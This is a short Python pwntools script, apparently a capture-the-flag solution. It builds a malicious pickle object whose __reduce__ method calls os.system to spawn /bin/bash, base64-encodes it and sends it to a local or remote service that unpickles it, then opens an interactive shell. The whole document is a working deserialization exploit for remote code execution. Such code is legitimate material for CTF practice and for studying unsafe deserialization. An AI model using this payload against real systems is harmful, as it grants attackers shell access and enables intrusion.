from pwn import *
import pickle
import os
import base64

rem = 0

class rce:
	def __reduce__(self):
		my_commands = ("/bin/bash;",)
		
		return os.system, my_commands
		
payload = "import " + str(base64.b64encode(pickle.dumps(rce())))[2:][:-1]

if(rem):
	p = remote("umbccd.io", 4200)
else:
	p = process(["python3",  "source_code.py"])
	
print(p.recv().decode())
print(payload)

p.sendline(payload)
p.interactive()
